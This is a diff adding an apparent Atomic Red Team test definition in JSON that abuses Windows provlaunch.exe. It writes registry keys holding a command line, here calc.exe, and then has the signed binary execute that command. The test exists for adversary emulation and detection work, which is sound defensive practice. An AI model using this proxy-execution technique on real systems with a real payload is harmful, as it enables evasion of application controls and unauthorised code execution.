@@ -1,0 +1,23 @@
+{
+  "id": "ab76e34f-28bf-441f-a39c-8db4835b89cc",
+  "name": "Provlaunch.exe Executes Arbitrary Command via Registry Key",
+  "description": "Provlaunch.exe executes a command defined in the Registry. This test will create the necessary registry keys and values, then run provlaunch.exe to execute an arbitrary command.\n- https://twitter.com/0gtweet/status/1674399582162153472\n- https://lolbas-project.github.io/lolbas/Binaries/Provlaunch/\nRegistry keys are deleted after successful execution.\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "58e2c267-f7e5-4ed6-aff7-6dee15355f1c",
+      "type": "execute-command",
+      "data": {
+        "command": "reg.exe add HKLM\\SOFTWARE\\Microsoft\\Provisioning\\Commands\\LOLBin\\dummy1 /v altitude /t REG_DWORD /d 0\nreg add HKLM\\SOFTWARE\\Microsoft\\Provisioning\\Commands\\LOLBin\\dummy1\\dummy2 /v Commandline /d calc.exe\nc:\\windows\\system32\\provlaunch.exe LOLBin\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    }
+  ],
+  "tags": [
+    "T1218",
+    "atomic-red-team"
+  ]
+}
